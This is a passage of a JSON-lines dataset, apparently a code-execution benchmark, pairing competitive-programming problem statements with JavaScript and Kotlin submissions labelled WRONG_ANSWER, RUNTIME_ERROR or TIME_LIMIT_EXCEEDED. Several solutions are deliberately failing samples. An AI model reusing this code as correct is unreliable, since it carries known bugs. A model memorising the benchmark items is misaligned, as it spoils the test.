+ td + tf).toFixed(5));\n    } else {\n      print(4);\n      vb = Math.sqrt(a * d + (w * w) \/ 2);\n      su = UniAccel.vel_change_disp(0, vb, a);\n      sd = UniAccel.vel_change_disp(vb, w, -a);\n      tu = UniAccel.disp_time(su, 0, a);\n      td = UniAccel.disp_time(sd, vb, -a);\n      print((tu + td + tf).toFixed(5));\n    }\n  }\n\n}).call(this);\n","description":"Everybody knows that the capital of Berland is connected to Bercouver (the Olympic capital) by a direct road. To improve the road's traffic capacity, there was placed just one traffic sign, limiting the maximum speed. Traffic signs in Berland are a bit peculiar, because they limit the speed only at that point on the road where they are placed. Right after passing the sign it is allowed to drive at any speed.It is known that the car of an average Berland citizen has the acceleration (deceleration) speed of a km\/h^2, and has maximum speed of v km\/h. The road has the length of l km, and the speed sign, limiting the speed to w km\/h, is placed d km (1\u2264d<l) away from the capital of Berland. The car has a zero speed at the beginning of the journey. Find the minimum time that an average Berland citizen will need to get from the capital to Bercouver, if he drives at the optimal speed.The car can enter Bercouver at any speed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input file contains two integer numbers a and v (1\u2264a,v\u226410000). The second line contains three integer numbers l, d and w (2\u2264l\u226410000; 1\u2264d<l; 1\u2264w\u226410000).\n","output_spec":"Print the answer with at least five digits after the decimal point.\n","notes":null,"sample_inputs":["1 1\n2 1 3\n","5 70\n200 170 40\n"],"sample_outputs":["2.500000000000\n","8.965874696353\n"]}
{"difficulty":1900,"lang":"Node.js","lang_cluster":"javascript","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_1094","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"\"use strict\";\nvar input = '';\nvar inputResolve;\nvar inputPromise = new Promise(resolve => inputResolve = resolve);\nprocess.stdin.on('data', c => input += c);\nprocess.stdin.on('end', () => {\n    inputResolve();\n});\n(async () => {\n    var t = Date.now();\n    await inputPromise;\n    var inputs = input.split(\/\\r?\\n\/);\n    var [n, k] = inputs[0].split(' ').map(v => +v);\n    var h = inputs[1].split(' ').map(v => +v);\n    var tree = new SplayTree();\n    tree.insert(h[0]);\n    var max = 1;\n    var allRes = [];\n    var i = 0, j = 0;\n    while (i < n) {\n        while (j < n) {\n            j++;\n            if (!h[j])\n                break;\n            tree.insert(h[j]);\n            if (tree.max() - tree.min() > k)\n                break;\n        }\n        if (max < j - i) {\n            max = j - i;\n            allRes = [(i + 1) + ' ' + j];\n        }\n        else if (max == j - i) {\n            allRes.push((i + 1) + ' ' + j);\n        }\n        max = Math.max(j - i, max);\n        tree.remove(h[i++]);\n        while (tree.max() - tree.min() > k) {\n            tree.remove(h[i++]);\n        }\n    }\n    console.log(max, allRes.length);\n    console.log(allRes.join('\\n'));\n    \/\/ console.log(Date.now() - t)\n})();\nvar SplayTree = eval(`\n(function () {\n  var Node = \/** @class *\/ (function () {\n    function Node(key, data) {\n      this.next = null;\n      this.key = key;\n      this.data = data;\n      this.left = null;\n      this.right = null;\n    }\n    return Node;\n  }());\n\n  \/* follows \"An implementation of top-down splaying\"\n   * by D. Sleator <sleator@cs.cmu.edu> March 1992\n   *\/\n  function DEFAULT_COMPARE(a, b) {\n    return a > b ? 1 : a < b ? -1 : 0;\n  }\n  \/**\n   * Simple top down splay, not requiring i to be in the tree t.\n   *\/\n  function splay(i, t, comparator) {\n    var N = new Node(null, null);\n    var l = N;\n    var r = N;\n    while (true) {\n      var cmp = comparator(i, t.key);\n      \/\/if (i < t.key) {\n      if (cmp < 0) {\n        if (t.left === null)\n          break;\n        \/\/if (i < t.left.key) {\n        if (comparator(i, t.left.key) < 0) {\n          var y = t.left; \/* rotate right *\/\n          t.left = y.right;\n          y.right = t;\n          t = y;\n          if (t.left === null)\n            break;\n        }\n        r.left = t; \/* link right *\/\n        r = t;\n        t = t.left;\n        \/\/} else if (i > t.key) {\n      }\n      else if (cmp > 0) {\n        if (t.right === null)\n          break;\n        \/\/if (i > t.right.key) {\n        if (comparator(i, t.right.key) > 0) {\n          var y = t.right; \/* rotate left *\/\n          t.right = y.left;\n          y.left = t;\n          t = y;\n          if (t.right === null)\n            break;\n        }\n        l.right = t; \/* link left *\/\n        l = t;\n        t = t.right;\n      }\n      else\n        break;\n    }\n    \/* assemble *\/\n    l.right = t.left;\n    r.left = t.right;\n    t.left = N.right;\n    t.right = N.left;\n    return t;\n  }\n  function insert(i, data, t, comparator) {\n    var node = new Node(i, data);\n    if (t === null) {\n      node.left = node.right = null;\n      return node;\n    }\n    t = splay(i, t, comparator);\n    var cmp = comparator(i, t.key);\n    if (cmp < 0) {\n      node.left = t.left;\n      node.right = t;\n      t.left = null;\n    }\n    else if (cmp >= 0) {\n      node.right = t.right;\n      node.left = t;\n      t.right = null;\n    }\n    return node;\n  }\n  function split(key, v, comparator) {\n    var left = null;\n    var right = null;\n    if (v) {\n      v = splay(key, v, comparator);\n      var cmp = comparator(v.key, key);\n      if (cmp === 0) {\n        left = v.left;\n        right = v.right;\n      }\n      else if (cmp < 0) {\n        right = v.right;\n        v.right = null;\n        left = v;\n      }\n      else {\n        left = v.left;\n        v.left = null;\n        right = v;\n      }\n    }\n    return { left: left, right: right };\n  }\n  function merge(left, right, comparator) {\n    if (right === null)\n      return left;\n    if (left === null)\n      return right;\n    right = splay(left.key, right, comparator);\n    right.left = left;\n    return right;\n  }\n  var Tree = \/** @class *\/ (function () {\n    function Tree(comparator) {\n      if (comparator === void 0) { comparator = DEFAULT_COMPARE; }\n      this._root = null;\n      this._size = 0;\n      this._comparator = comparator;\n    }\n    \/**\n     * Inserts a key, allows duplicates\n     *\/\n    Tree.prototype.insert = function (key, data) {\n      this._size++;\n      return this._root = insert(key, data, this._root, this._comparator);\n    };\n    \/**\n     * Adds a key, if it is not present in the tree\n     *\/\n    Tree.prototype.add = function (key, data) {\n      var node = new Node(key, data);\n      if (this._root === null) {\n        node.left = node.right = null;\n        this._size++;\n        this._root = node;\n      }\n      var comparator = this._comparator;\n      var t = splay(key, this._root, comparator);\n      var cmp = comparator(key, t.key);\n      if (cmp === 0)\n        this._root = t;\n      else {\n        if (cmp < 0) {\n          node.left = t.left;\n          node.right = t;\n          t.left = null;\n        }\n        else if (cmp > 0) {\n          node.right = t.right;\n          node.left = t;\n          t.right = null;\n        }\n        this._size++;\n        this._root = node;\n      }\n      return this._root;\n    };\n    \/**\n     * @param  {Key} key\n     * @return {Node|null}\n     *\/\n    Tree.prototype.remove = function (key) {\n      this._root = this._remove(key, this._root, this._comparator);\n    };\n    \/**\n     * Deletes i from the tree if it's there\n     *\/\n    Tree.prototype._remove = function (i, t, comparator) {\n      var x;\n      if (t === null)\n        return null;\n      t = splay(i, t, comparator);\n      var cmp = comparator(i, t.key);\n      if (cmp === 0) { \/* found it *\/\n        if (t.left === null) {\n          x = t.right;\n        }\n        else {\n          x = splay(i, t.left, comparator);\n          x.right = t.right;\n        }\n        this._size--;\n        return x;\n      }\n      return t; \/* It wasn't there *\/\n    };\n    \/**\n     * Removes and returns the node with smallest key\n     *\/\n    Tree.prototype.pop = function () {\n      var node = this._root;\n      if (node) {\n        while (node.left)\n          node = node.left;\n        this._root = splay(node.key, this._root, this._comparator);\n        this._root = this._remove(node.key, this._root, this._comparator);\n        return { key: node.key, data: node.data };\n      }\n      return null;\n    };\n    \/**\n     * Find without splaying\n     *\/\n    Tree.prototype.findStatic = function (key) {\n      var current = this._root;\n      var compare = this._comparator;\n      while (current) {\n        var cmp = compare(key, current.key);\n        if (cmp === 0)\n          return current;\n        else if (cmp < 0)\n          current = current.left;\n        else\n          current = current.right;\n      }\n      return null;\n    };\n    Tree.prototype.find = function (key) {\n      if (this._root) {\n        this._root = splay(key, this._root, this._comparator);\n        if (this._comparator(key, this._root.key) !== 0)\n          return null;\n      }\n      return this._root;\n    };\n    Tree.prototype.contains = function (key) {\n      var current = this._root;\n      var compare = this._comparator;\n      while (current) {\n        var cmp = compare(key, current.key);\n        if (cmp === 0)\n          return true;\n        else if (cmp < 0)\n          current = current.left;\n        else\n          current = current.right;\n      }\n      return false;\n    };\n    Tree.prototype.forEach = function (visitor, ctx) {\n      var current = this._root;\n      var Q = []; \/* Initialize stack s *\/\n      var done = false;\n      while (!done) {\n        if (current !== null) {\n          Q.push(current);\n          current = current.left;\n        }\n        else {\n          if (Q.length !== 0) {\n            current = Q.pop();\n            visitor.call(ctx, current);\n            current = current.right;\n          }\n          else\n            done = true;\n        }\n      }\n      return this;\n    };\n\n    Tree.prototype.range = function (low, high, fn, ctx) {\n      var Q = [];\n      var compare = this._comparator;\n      var node = this._root;\n      var cmp;\n      while (Q.length !== 0 || node) {\n        if (node) {\n          Q.push(node);\n          node = node.left;\n        }\n        else {\n          node = Q.pop();\n          cmp = compare(node.key, high);\n          if (cmp > 0) {\n            break;\n          }\n          else if (compare(node.key, low) >= 0) {\n            if (fn.call(ctx, node))\n              return this; \/\/ stop if smth is returned\n          }\n          node = node.right;\n        }\n      }\n      return this;\n    };\n    \/**\n     * Returns array of keys\n     *\/\n    Tree.prototype.keys = function () {\n      var keys = [];\n      this.forEach(function (_a) {\n        var key = _a.key;\n        return keys.push(key);\n      });\n      return keys;\n    };\n    \/**\n     * Returns array of all the data in the nodes\n     *\/\n    Tree.prototype.values = function () {\n      var values = [];\n      this.forEach(function (_a) {\n        var data = _a.data;\n        return values.push(data);\n      });\n      return values;\n    };\n    Tree.prototype.min = function () {\n      if (this._root)\n        return this.minNode(this._root).key;\n      return null;\n    };\n    Tree.prototype.max = function () {\n      if (this._root)\n        return this.maxNode(this._root).key;\n      return null;\n    };\n    Tree.prototype.minNode = function (t) {\n      if (t === void 0) { t = this._root; }\n      if (t)\n        while (t.left)\n          t = t.left;\n      return t;\n    };\n    Tree.prototype.maxNode = function (t) {\n      if (t === void 0) { t = this._root; }\n      if (t)\n        while (t.right)\n          t = t.right;\n      return t;\n    };\n    \/**\n     * Returns node at given index\n     *\/\n    Tree.prototype.at = function (index) {\n      var current = this._root;\n      var done = false;\n      var i = 0;\n      var Q = [];\n      while (!done) {\n        if (current) {\n          Q.push(current);\n          current = current.left;\n        }\n        else {\n          if (Q.length > 0) {\n            current = Q.pop();\n            if (i === index)\n              return current;\n            i++;\n            current = current.right;\n          }\n          else\n            done = true;\n        }\n      }\n      return null;\n    };\n    Tree.prototype.next = function (d) {\n      var root = this._root;\n      var successor = null;\n      if (d.right) {\n        successor = d.right;\n        while (successor.left)\n          successor = successor.left;\n        return successor;\n      }\n      var comparator = this._comparator;\n      while (root) {\n        var cmp = comparator(d.key, root.key);\n        if (cmp === 0)\n          break;\n        else if (cmp < 0) {\n          successor = root;\n          root = root.left;\n        }\n        else\n          root = root.right;\n      }\n      return successor;\n    };\n    Tree.prototype.prev = function (d) {\n      var root = this._root;\n      var predecessor = null;\n      if (d.left !== null) {\n        predecessor = d.left;\n        while (predecessor.right)\n          predecessor = predecessor.right;\n        return predecessor;\n      }\n      var comparator = this._comparator;\n      while (root) {\n        var cmp = comparator(d.key, root.key);\n        if (cmp === 0)\n          break;\n        else if (cmp < 0)\n          root = root.left;\n        else {\n          predecessor = root;\n          root = root.right;\n        }\n      }\n      return predecessor;\n    };\n    Tree.prototype.clear = function () {\n      this._root = null;\n      this._size = 0;\n      return this;\n    };\n    Tree.prototype.toList = function () {\n      return toList(this._root);\n    };\n    \/**\n     * Bulk-load items. Both array have to be same size\n     *\/\n    Tree.prototype.load = function (keys, values, presort) {\n      if (values === void 0) { values = []; }\n      if (presort === void 0) { presort = false; }\n      var size = keys.length;\n      var comparator = this._comparator;\n      \/\/ sort if needed\n      if (presort)\n        sort(keys, values, 0, size - 1, comparator);\n      if (this._root === null) { \/\/ empty tree\n        this._root = loadRecursive(keys, values, 0, size);\n        this._size = size;\n      }\n      else { \/\/ that re-builds the whole tree from two in-order traversals\n        var mergedList = mergeLists(this.toList(), createList(keys, values), comparator);\n        size = this._size + size;\n        this._root = sortedListToBST({ head: mergedList }, 0, size);\n      }\n      return this;\n    };\n    Tree.prototype.isEmpty = function () { return this._root === null; };\n    Object.defineProperty(Tree.prototype, \"size\", {\n      get: function () { return this._size; },\n      enumerable: true,\n      configurable: true\n    });\n    Object.defineProperty(Tree.prototype, \"root\", {\n      get: function () { return this._root; },\n      enumerable: true,\n      configurable: true\n    });\n    Tree.prototype.toString = function (printNode) {\n      if (printNode === void 0) { printNode = function (n) { return String(n.key); }; }\n      var out = [];\n      printRow(this._root, '', true, function (v) { return out.push(v); }, printNode);\n      return out.join('');\n    };\n    Tree.prototype.update = function (key, newKey, newData) {\n      var comparator = this._comparator;\n      var _a = split(key, this._root, comparator), left = _a.left, right = _a.right;\n      if (comparator(key, newKey) < 0) {\n        right = insert(newKey, newData, right, comparator);\n      }\n      else {\n        left = insert(newKey, newData, left, comparator);\n      }\n      this._root = merge(left, right, comparator);\n    };\n    Tree.prototype.split = function (key) {\n      return split(key, this._root, this._comparator);\n    };\n    return Tree;\n  }());\n  function loadRecursive(keys, values, start, end) {\n    var size = end - start;\n    if (size > 0) {\n      var middle = start + Math.floor(size \/ 2);\n      var key = keys[middle];\n      var data = values[middle];\n      var node = new Node(key, data);\n      node.left = loadRecursive(keys, values, start, middle);\n      node.right = loadRecursive(keys, values, middle + 1, end);\n      return node;\n    }\n    return null;\n  }\n  function createList(keys, values) {\n    var head = new Node(null, null);\n    var p = head;\n    for (var i = 0; i < keys.length; i++) {\n      p = p.next = new Node(keys[i], values[i]);\n    }\n    p.next = null;\n    return head.next;\n  }\n  function toList(root) {\n    var current = root;\n    var Q = [];\n    var done = false;\n    var head = new Node(null, null);\n    var p = head;\n    while (!done) {\n      if (current) {\n        Q.push(current);\n        current = current.left;\n      }\n      else {\n        if (Q.length > 0) {\n          current = p = p.next = Q.pop();\n          current = current.right;\n        }\n        else\n          done = true;\n      }\n    }\n    p.next = null; \/\/ that'll work even if the tree was empty\n    return head.next;\n  }\n  function sortedListToBST(list, start, end) {\n    var size = end - start;\n    if (size > 0) {\n      var middle = start + Math.floor(size \/ 2);\n      var left = sortedListToBST(list, start, middle);\n      var root = list.head;\n      root.left = left;\n      list.head = list.head.next;\n      root.right = sortedListToBST(list, middle + 1, end);\n      return root;\n    }\n    return null;\n  }\n  function mergeLists(l1, l2, compare) {\n    var head = new Node(null, null); \/\/ dummy\n    var p = head;\n    var p1 = l1;\n    var p2 = l2;\n    while (p1 !== null && p2 !== null) {\n      if (compare(p1.key, p2.key) < 0) {\n        p.next = p1;\n        p1 = p1.next;\n      }\n      else {\n        p.next = p2;\n        p2 = p2.next;\n      }\n      p = p.next;\n    }\n    if (p1 !== null) {\n      p.next = p1;\n    }\n    else if (p2 !== null) {\n      p.next = p2;\n    }\n    return head.next;\n  }\n  function sort(keys, values, left, right, compare) {\n    if (left >= right)\n      return;\n    var pivot = keys[(left + right) >> 1];\n    var i = left - 1;\n    var j = right + 1;\n    while (true) {\n      do\n        i++;\n      while (compare(keys[i], pivot) < 0);\n      do\n        j--;\n      while (compare(keys[j], pivot) > 0);\n      if (i >= j)\n        break;\n      var tmp = keys[i];\n      keys[i] = keys[j];\n      keys[j] = tmp;\n      tmp = values[i];\n      values[i] = values[j];\n      values[j] = tmp;\n    }\n    sort(keys, values, left, j, compare);\n    sort(keys, values, j + 1, right, compare);\n  }\n\n  return Tree;\n\n})();\n`);\n","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":1000,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"0515ac888937a4dda30cad5e2383164f","submission_id":"02e3315f7e902473fe3bd4e1a9ceb426","tags":["implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"fun main() {\n    val (n, k) = readLine()!!\n        .split(\" \")\n        .map { it.toInt() }\n    val s = readLine()!!\n    var cnv = 0\n    var ans = \"1\"\n    for (i in 0 until n) {\n        if (i == 0) {\n            if (s[i] != '1') {\n                cnv += 1\n            }\n            continue\n        } else {\n            if (s[i] != '0') {\n                cnv += 1\n            }\n            ans += \"0\"\n        }\n        if (cnv == k) {\n            ans += s.substring(i + 1)\n            break\n        }\n    }\n    println(if (ans == \"1\") \"0\" else ans)\n}\n","description":"Ania has a large integer $$$S$$$. Its decimal representation has length $$$n$$$ and doesn't contain any leading zeroes. Ania is allowed to change at most $$$k$$$ digits of $$$S$$$. She wants to do it in such a way that $$$S$$$ still won't contain any leading zeroes and it'll be minimal possible. What integer will Ania finish with?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\leq n \\leq 200\\,000$$$, $$$0 \\leq k \\leq n$$$) \u2014 the number of digits in the decimal representation of $$$S$$$ and the maximum allowed number of changed digits. The second line contains the integer $$$S$$$. It's guaranteed that $$$S$$$ has exactly $$$n$$$ digits and doesn't contain any leading zeroes.","output_spec":"Output the minimal possible value of $$$S$$$ which Ania can end with. Note that the resulting integer should also have $$$n$$$ digits.","notes":"NoteA number has leading zeroes if it consists of at least two digits and its first digit is $$$0$$$. For example, numbers $$$00$$$, $$$00069$$$ and $$$0101$$$ have leading zeroes, while $$$0$$$, $$$3000$$$ and $$$1010$$$ don't have leading zeroes.","sample_inputs":["5 3\n51528","3 2\n102","1 1\n1"],"sample_outputs":["10028","100","0"]}
{"difficulty":1400,"lang":"Kotlin","lang_cluster":"kotlin","src_uid":"08f1ba79ced688958695a7cfcfdda035","submission_id":"8406d61b9d2c49a824cbaa0ed79c2de3","tags":["dp"],"exec_outcome":"TIME_LIMIT_EXCEEDED","source_code":"fun main() {\n    val r = System.`in`.bufferedReader()\n    val s = StringBuilder()\n    val l = r.readLine()!!.toInt()\n    val day = r.readLine()!!.split(\" \").map { it.toInt() }\n    fun f(i: Int, type: Int): Int =\n        when{\n            i == l-1 -> if (type==day[i]||day[i]==3) 0 else 1\n            type==day[i]||day[i]==3 -> f(i+1, 3-type)\n            else -> 1+ minOf(f(i+1, type), f(i+1, 3-type))\n        }\n    println(minOf(f(0, 1), f(0, 2)))\n}","description":"Vasya has n days of vacations! So he decided to improve his IT skills and do sport. Vasya knows the following information about each of this n days: whether that gym opened and whether a contest was carried out in the Internet on that day. For the i-th day there are four options:  on this day the gym is closed and the contest is not carried out;  on this day the gym is closed and the contest is carried out;  on this day the gym is open and the contest is not carried out;  on this day the gym is open and the contest is carried out. On each of days Vasya can either have a rest or write the contest (if it is carried out on this day), or do sport (if the gym is open on this day).Find the minimum number of days on which Vasya will have a rest (it means, he will not do sport and write the contest at the same time). The only limitation that Vasya has \u2014 he does not want to do the same activity on two consecutive days: it means, he will not do sport on two consecutive days, and write the contest on two consecutive days.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of days of Vasya's vacations. The second line contains the sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u20093) separated by space, where:    ai equals 0, if on the i-th day of vacations the gym is closed and the contest is not carried out;  ai equals 1, if on the i-th day of vacations the gym is closed, but the contest is carried out;  ai equals 2, if on the i-th day of vacations the gym is open and the contest is not carried out;  ai equals 3, if on the i-th day of vacations the gym is open and the contest is carried out.","output_spec":"Print the minimum possible number of days on which Vasya will have a rest. Remember that Vasya refuses:   to do sport on any two consecutive days,  to write the contest on any two consecutive days. ","notes":"NoteIn the first test Vasya can write the contest on the day number 1 and do sport on the day number 3. Thus, he will have a rest for only 2 days.In the second test Vasya should write contests on days number 1, 3, 5 and 7, in other days do sport. Thus, he will not have a rest for a single day.In the third test Vasya can do sport either on a day number 1 or number 2. He can not do sport in two days, because it will be contrary to the his limitation. Thus, he will have a rest for only one day.","sample_inputs":["4\n1 3 2 0","7\n1 3 3 2 1 2 3","2\n2 2"],"sample_outputs":["2","0","1"]}
{"difficulty":1200,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"134_A","submission_id":"223478179","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"private fun readInt() = readString().toInt()\r\nprivate fun readString() = readLine().toString()\r\nprivate fun readDouble() = readString().toDouble()\r\nprivate fun readListString() = readString().split(\" \")\r\nprivate fun readListInt() = readString().split(\" \").map { it.toInt() }\r\n\r\n\r\nfun main() {\r\n\r\n    readInt()\r\n    val nums = readListInt()\r\n    var sum = 0L\r\n    for (n in nums)\r\n        sum += n\r\n    val ans = mutableListOf<Int>()\r\n    for (i in 0 until nums.size) {\r\n        val left = sum - nums[i]\r\n        if (left \/ (nums.size - 1) == nums[i].toLong()) {\r\n            ans.add(i + 1)\r\n        }\r\n    }\r\n    println(ans.size)\r\n    if (ans.isNotEmpty()) {\r\n        println(ans.joinToString(\" \"))\r\n    }\r\n\r\n}\r\n\r\n\r\n","description":"You are given a sequence of positive integers a1,a2,...,an. Find all such indices i, that the i-th element equals the arithmetic mean of all other elements (that is all elements except for this one).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the integer n (2\u2264n\u22642\u00b710^5). The second line contains elements of the sequence a1,a2,...,an (1\u2264ai\u22641000). All the elements are positive integers.\n","output_spec":"Print on the first line the number of the sought indices. Print on the second line the sought indices in the increasing order. All indices are integers from 1 to n.\nIf the sought elements do not exist, then the first output line should contain number 0. In this case you may either not print the second line or print an empty line.\n","notes":null,"sample_inputs":["5\n1 2 3 4 5\n","4\n50 50 50 50\n"],"sample_outputs":["1\n3 ","4\n1 2 3 4 "]}
{"difficulty":900,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"160_A","submission_id":"199632267","tags":["greedy","sortings"],"exec_outcome":"RUNTIME_ERROR","source_code":"fun main() {\r\n    val n = readln().toInt()\r\n    val coins = readln().split(\" \").map{ it.toInt() }\r\n    var sum = 0\r\n    var count = 0\r\n\r\n    coins.sortedDescending()\r\n\r\n    for (coin in coins) {\r\n        sum += coin\r\n        count++\r\n        if (sum > coins.sum() - sum) {\r\n            break\r\n        }\r\n    }\r\n    println(count)\r\n}","description":"Imagine that you have a twin brother or sister. Having another person that looks exactly like you seems very unusual. It's hard to say if having something of an alter ego is good or bad. And if you do have a twin, then you very well know what it's like.Now let's imagine a typical morning in your family. You haven't woken up yet, and Mom is already going to work. She has been so hasty that she has nearly forgotten to leave the two of her darling children some money to buy lunches in the school cafeteria. She fished in the purse and found some number of coins, or to be exact, n coins of arbitrary values a1,a2,...,an. But as Mom was running out of time, she didn't split the coins for you two. So she scribbled a note asking you to split the money equally.As you woke up, you found Mom's coins and read her note. \"But why split the money equally?\" \u2014 you thought. After all, your twin is sleeping and he won't know anything. So you decided to act like that: pick for yourself some subset of coins so that the sum of values of your coins is strictly larger than the sum of values of the remaining coins that your twin will have. However, you correctly thought that if you take too many coins, the twin will suspect the deception. So, you've decided to stick to the following strategy to avoid suspicions: you take the minimum number of coins, whose sum of values is strictly more than the sum of values of the remaining coins. On this basis, determine what minimum number of coins you need to take to divide them in the described manner.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2264n\u2264100) \u2014 the number of coins. The second line contains a sequence of n integers a1, a2, ..., an (1\u2264ai\u2264100) \u2014 the coins' values. All numbers are separated with spaces.\n","output_spec":"In the single line print the single number \u2014 the minimum needed number of coins.\n","notes":"In the first sample you will have to take 2 coins (you and your twin have sums equal to 6,0 correspondingly). If you take 1 coin, you get sums 3,3. If you take 0 coins, you get sums 0,6. Those variants do not satisfy you as your sum should be strictly more that your twins' sum.\nIn the second sample one coin isn't enough for us, too. You can pick coins with values 1,2 or 2,2. In any case, the minimum number of coins equals 2. \n","sample_inputs":["2\n3 3\n","3\n2 1 2\n"],"sample_outputs":["2\n","2\n"]}
{"difficulty":1100,"lang":"Kotlin 1.7","lang_cluster":"kotlin","src_uid":"186_A","submission_id":"182584138","tags":["implementation","strings"],"exec_outcome":"RUNTIME_ERROR","source_code":"\/\/  A. Comparing Strings\r\n\r\n\/\/ region Preamble\r\n\r\nimport java.util.concurrent.ConcurrentHashMap\r\nimport kotlin.math.*\r\n\r\n\/\/ IO\r\nval reader = System.`in`.bufferedReader()\r\nval writer = System.out.bufferedWriter()\r\n\r\nfun readLn(): String = reader.readLine()\r\nfun readInt() = readLn().toInt()\r\nfun readLong() = readLn().toLong()\r\nfun readDouble() = readLn().toDouble()\r\nfun readWords() = readLn().split(\" \")\r\nfun readInts() = readWords().map { it.toInt() }\r\nfun readLongs() = readWords().map { it.toLong() }\r\nfun readDoubles() = readWords().map { it.toDouble() }\r\nfun readLines(n: Int) = List(n) { readLn() }\r\n\r\nfun Boolean.yesNo() = if (this) \"YES\" else \"NO\"\r\nfun writeLn(s: String) = writer.write(\"$s\\n\")\r\n\r\n@JvmName(\"writeLn1\")\r\nfun String.writeLn() = writer.write(\"\\n\")\r\n\r\n\/\/ Functional\r\nfun List<Int>.cumulativeSum1() = runningFold(0) { x, y -> x + y }\r\nfun List<Int>.cumulativeSum() = cumulativeSum1().drop(1)\r\n\r\n@JvmName(\"cumulativeSum1Long\")\r\nfun List<Long>.cumulativeSum1() = runningFold(0L) { x, y -> x + y }\r\n\r\n@JvmName(\"cumulativeSumLong\")\r\nfun List<Long>.cumulativeSum() = cumulativeSum1().drop(1)\r\n\r\nfun <E> List<E>.isDistinct() = size == toSet().size\r\n\r\nfun <T> List<T>.histogram() = groupingBy { it }.eachCount().withDefault { 0 }\r\nfun String.histogram() = groupingBy { it }.eachCount().withDefault { 0 }\r\n\r\nfun <T> List<T>.groupContiguous(): List<List<T>> {\r\n  val groups = mutableListOf<MutableList<T>>()\r\n  forEach { e ->\r\n    if (e == groups.lastOrNull()?.lastOrNull()) {\r\n      groups.last().add(e)\r\n    } else {\r\n      groups.add(mutableListOf(e))\r\n    }\r\n  }\r\n  return groups\r\n}\r\n\r\nfun <T> permutationsWithReplacement(input: Set<T>, n: Int): List<List<T>> =\r\n  if (n <= 0) listOf(emptyList())\r\n  else input.flatMap { first ->\r\n    permutationsWithReplacement(input, n - 1).map { rest ->\r\n      listOf(first) + rest\r\n    }\r\n  }\r\n\r\nfun <T> permutations(input: Set<T>): List<List<T>> {\r\n  if (input.isEmpty()) return listOf(emptyList())\r\n\r\n  val first = input.first()\r\n  val tail = input.drop(1).toSet()\r\n\r\n  return permutations(tail).flatMap { rest ->\r\n    (0..rest.size).map {\r\n      buildList {\r\n        addAll(rest.take(it))\r\n        add(first)\r\n        addAll(rest.drop(it))\r\n      }\r\n    }\r\n  }\r\n}\r\n\r\nfun <T> combinations(input: Set<T>, n: Int): Set<Set<T>> {\r\n  if (n <= 0) return setOf(emptySet())\r\n  if (input.isEmpty()) return emptySet()\r\n\r\n  val first = input.take(1).toSet()\r\n  val tail = input.drop(1).toSet()\r\n\r\n  return combinations(tail, n - 1).map { rest -> first + rest }.toSet() + combinations(tail, n)\r\n}\r\n\r\n\/\/ Math\r\nfun Int.isOdd() = this % 2 == 1\r\nfun Long.isOdd() = this % 2 == 1L\r\nfun Int.isEven() = !isOdd()\r\nfun Long.isEven() = !isOdd()\r\nfun Int.isZero() = this == 0\r\nfun Long.isZero() = this == 0L\r\nfun Int.isPositive() = this > 0\r\nfun Long.isPositive() = this > 0L\r\nfun Int.isNegative() = this < 0\r\nfun Long.isNegative() = this < 0L\r\nfun Int.isPositiveOrZero() = this >= 0\r\nfun Long.isPositiveOrZero() = this >= 0L\r\nfun Int.isNegativeOrZero() = this <= 0\r\nfun Long.isNegativeOrZero() = this <= 0L\r\n\r\ninfix fun Int.divides(o: Int) = o % this == 0\r\ninfix fun Long.divides(o: Long) = o % this == 0L\r\ninfix fun Int.divisibleBy(o: Int) = o divides this\r\ninfix fun Long.divisibleBy(o: Long) = o divides this\r\n\r\ninfix fun Int.floorDiv(o: Int) = floor(toDouble() \/ o).toInt()\r\ninfix fun Long.floorDiv(o: Long) = floor(toDouble() \/ o).toInt()\r\ninfix fun Int.ceilDiv(o: Int) = ceil(toDouble() \/ o).toInt()\r\ninfix fun Long.ceilDiv(o: Long) = ceil(toDouble() \/ o).toInt()\r\n\r\ninfix fun Int.mod(m: Int) = ((this % m) + m) % m\r\ninfix fun Long.mod(m: Long) = ((this % m) + m) % m\r\n\r\n\/\/ Number Theory\r\nfun primeSieve(n: Int): List<Boolean> {\r\n  val s = BooleanArray(n + 1) { true }\r\n  val limit = sqrt(n.toDouble()).toInt()\r\n  